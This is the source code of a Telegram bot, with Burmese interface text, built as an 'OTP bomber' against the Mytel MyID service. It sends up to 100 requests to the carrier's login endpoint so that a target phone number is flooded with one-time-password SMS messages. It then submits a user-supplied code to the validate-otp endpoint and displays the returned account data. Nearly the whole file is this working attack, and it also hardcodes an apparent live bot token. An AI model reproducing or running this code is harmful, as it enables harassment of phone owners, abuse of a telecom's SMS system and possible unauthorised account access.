import logging
import requests
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# --- Config ---
API_TOKEN = '8702294693:AAGbo2lTWP-aV1jV8Be6nN5NSnz2WO_aZJk'
logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# --- States ---
class MytelBomber(StatesGroup):
    waiting_phone = State()
    waiting_count = State()
    waiting_otp = State()

# Header for Mytel API
HEADERS = {
    'User-Agent': 'MyID/3.2.1 (Android; 13)',
    'Content-Type': 'application/json'
}

# --- Keyboards ---
def get_cancel_kb():
    return InlineKeyboardMarkup().add(InlineKeyboardButton("🛑 CANCEL ACTION", callback_data="cancel"))

# --- Handlers ---

@dp.message_handler(commands=['start'])
async def cmd_start(m: types.Message):
    welcome_text = (
        "🛡 **MYID OTP UTILITY - v2.0**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "စနစ်ကို အသုံးပြု၍ Mytel OTP များကို \n"
        "အကြိမ်ရေအလိုက် ပို့လွှတ်နိုင်ပါသည်။\n\n"
        "🔹 **Commands:**\n"
        "➥ /login - စနစ်ကို စတင်ရန်\n"
        "➥ /help  - အကူအညီ ရယူရန်\n\n"
        "**Developed by Dominic**"
    )
    await m.answer(welcome_text, parse_mode="Markdown")

@dp.message_handler(commands=['login'], state="*")
async def start_login(m: types.Message):
    await m.answer("📱 **အသုံးပြုမည့် ဖုန်းနံပါတ် ရိုက်ထည့်ပါ-**\n(ဥပမာ - 0969xxxxxxx)", reply_markup=get_cancel_kb())
    await MytelBomber.waiting_phone.set()

@dp.callback_query_handler(text="cancel", state="*")
async def cancel_action(cb: types.CallbackQuery, state: FSMContext):
    await state.finish()
    await cb.message.edit_text("❌ **လုပ်ဆောင်ချက်ကို ရပ်ဆိုင်းလိုက်ပါပြီ။**")
    await cb.answer()

@dp.message_handler(state=MytelBomber.waiting_phone)
async def process_phone(m: types.Message, state: FSMContext):
    phone = m.text.strip()
    if not phone.startswith("09") or len(phone) < 9:
        return await m.reply("❌ **ဖုန်းနံပါတ် ပုံစံ မှားယွင်းနေပါသည်။**")

    await state.update_data(phone=phone)
    await m.answer(f"🔢 **TARGET:** `{phone}`\n\nပို့လွှတ်လိုသည့် OTP အကြိမ်ရေကို ရိုက်ထည့်ပါ:\n(အများဆုံး ၁၀၀ ကြိမ်အထိသာ)")
    await MytelBomber.waiting_count.set()

@dp.message_handler(state=MytelBomber.waiting_count)
async def process_count(m: types.Message, state: FSMContext):
    if not m.text.isdigit():
        return await m.reply("❌ **ဂဏန်းများသာ ရိုက်ထည့်ပေးပါ။**")
    
    count = int(m.text)
    if count < 1 or count > 100:
        return await m.reply("⚠️ **၁ မှ ၁၀၀ ကြိမ်အတွင်းသာ ရွေးချယ်ပါ။**")

    user_data = await state.get_data()
    phone = user_data.get("phone")
    
    status_msg = await m.answer(f"⚙️ **SYSTEM INITIALIZING...**\n━━━━━━━━━━━━━━\n📱 PHONE: `{phone}`\n📊 TOTAL: `{count}`", parse_mode="Markdown")
    
    success = 0
    fail = 0
    url = f"https://apis.mytel.com.mm/myid/authen/v1.0/v2/login/action/check-account?phoneNumber={phone}"

    for i in range(1, count + 1):
        try:
            res = requests.get(url, headers=HEADERS, timeout=5)
            if res.status_code == 200:
                success += 1
            else:
                fail += 1
            
            if i % 3 == 0 or i == count:
                progress_bar = "▓" * (i // 10) + "░" * (10 - (i // 10))
                await status_msg.edit_text(
                    f"⚡ **OTP BOMBING IN PROGRESS...**\n"
                    f"━━━━━━━━━━━━━━\n"
                    f"🎯 TARGET: `{phone}`\n"
                    f"📈 PROGRESS: `{i}/{count}`\n"
                    f"🔋 STATUS: [{progress_bar}]\n\n"
                    f"✅ SUCCESS: `{success}`\n"
                    f"❌ FAILED: `{fail}`",
                    parse_mode="Markdown"
                )
            await asyncio.sleep(0.4) 
        except:
            fail += 1

    await status_msg.edit_text(
        f"🏁 **PROCESS COMPLETED**\n"
        f"━━━━━━━━━━━━━━\n"
        f"📱 TARGET: `{phone}`\n"
        f"✅ SUCCESS: `{success}`\n"
        f"❌ FAILED: `{fail}`\n\n"
        "💡 OTP ရရှိပါက Login ဝင်ရန် ခြောက်လုံးဂဏန်း ရိုက်ထည့်ပါ။",
        parse_mode="Markdown"
    )
    await MytelBomber.waiting_otp.set()

@dp.message_handler(state=MytelBomber.waiting_otp)
async def process_otp(m: types.Message, state: FSMContext):
    otp = m.text.strip()
    data = await state.get_data()
    phone = data.get("phone")

    v_url = "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/validate-otp"
    payload = {"phoneNumber": phone, "otp": otp, "isWap": False}

    try:
        res = requests.post(v_url, json=payload, headers=HEADERS)
        if res.status_code == 200:
            await m.answer(f"💎 **ACCESS GRANTED**\n\nData Log:\n`{res.json()}`", parse_mode="Markdown")
        else:
            await m.answer("❌ **OTP မှားယွင်းနေပါသည်။**")
    except Exception as e:
        await m.answer(f"⚠️ **ERROR:** `{e}`")
    
    await state.finish()

if __name__ == '__main__':
    print("Dominic MyID System Online.")
    executor.start_polling(dp, skip_updates=True)
